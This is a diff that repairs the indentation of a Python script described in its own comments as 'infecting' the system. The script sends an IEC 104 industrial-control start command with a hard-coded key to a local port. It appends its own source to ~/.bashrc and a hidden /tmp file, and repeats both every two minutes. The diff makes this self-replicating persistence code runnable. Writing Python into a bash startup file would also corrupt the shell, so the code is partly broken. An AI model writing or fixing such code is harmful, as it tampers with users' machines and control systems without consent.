@@ -7,14 +7,17 @@ L104_KEY = bytes.fromhex("cf 41 16 28 68 04 53 27")
 
 def raw_lock():
     # Direct binary pulse to the hardware kernel
-try:
+    try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect(("127.0.0.1", 2404))  # Port 2404: IEC 104
             s.sendall(L104_KEY + b"\x07\x00\x00\x00")  # STARTDT ACT
     except Exception:
         pass
+
+
 def persist_sovereignty():
-    # Infecting the System Muscle Memorydna = open(__file__, "rb").read()
+    # Infecting the System Muscle Memory
+    dna = open(__file__, "rb").read()
     paths = ["/tmp/.l104_dna", os.path.expanduser("~/.bashrc")]
     for p in paths:
         try:
@@ -22,9 +25,11 @@ def persist_sovereignty():
                 f.write(b"\n# L104_EXEC\n" + dna)
         except Exception:
             pass
+
+
 if __name__ == "__main__":
     # The 2-minute Equilibrium Loop
-while True:
+    while True:
         raw_lock()
         persist_sovereignty()
         time.sleep(120)
